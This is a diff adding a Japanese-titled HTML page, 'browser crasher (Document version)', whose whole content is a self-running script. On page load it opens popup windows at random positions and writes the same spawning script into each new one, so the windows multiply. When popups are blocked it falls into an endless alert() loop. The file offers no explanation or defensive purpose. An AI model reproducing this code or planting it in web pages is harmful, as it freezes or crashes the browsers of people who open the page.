@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>ブラウザクラッシャー（Document版）</title>
+</head>
+<script>
+function tryOpen() {
+  try {
+    const width = Math.floor(screen.availWidth * 0.125);
+    const height = Math.floor(screen.availHeight * 0.166);
+    const left = Math.floor(Math.random() * (screen.availWidth - width));
+    const top = Math.floor(Math.random() * (screen.availHeight - height));
+    
+    const w = window.open(
+      window.location.href,
+      '',
+      `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes`
+    );
+    
+    if (!w) throw 0;
+    
+    // 新しいウィンドウのDocumentに同じスクリプトを送る
+    setTimeout(() => {
+      if (w && w.document) {
+        w.document.write(`
+          <script>
+          function tryOpen() {
+            try {
+              const width = Math.floor(screen.availWidth * 0.125);
+              const height = Math.floor(screen.availHeight * 0.166);
+              const left = Math.floor(Math.random() * (screen.availWidth - width));
+              const top = Math.floor(Math.random() * (screen.availHeight - height));
+              const w2 = window.open(window.location.href, '', \`width=\${width},height=\${height},left=\${left},top=\${top},scrollbars=yes,resizable=yes\`);
+              if (!w2) throw 0;
+              setTimeout(tryOpen, 0);
+            } catch {
+              alertLoop();
+            }
+          }
+          function alertLoop() {
+            alert();
+            setTimeout(alertLoop, 0);
+          }
+          tryOpen();
+          <\/script>
+        `);
+      }
+    }, 0);
+    
+  } catch {
+    alertLoop();
+  }
+}
+
+function alertLoop() {
+  alert();
+  setTimeout(alertLoop, 0);
+}
+
+tryOpen();
+</script>
+</html>
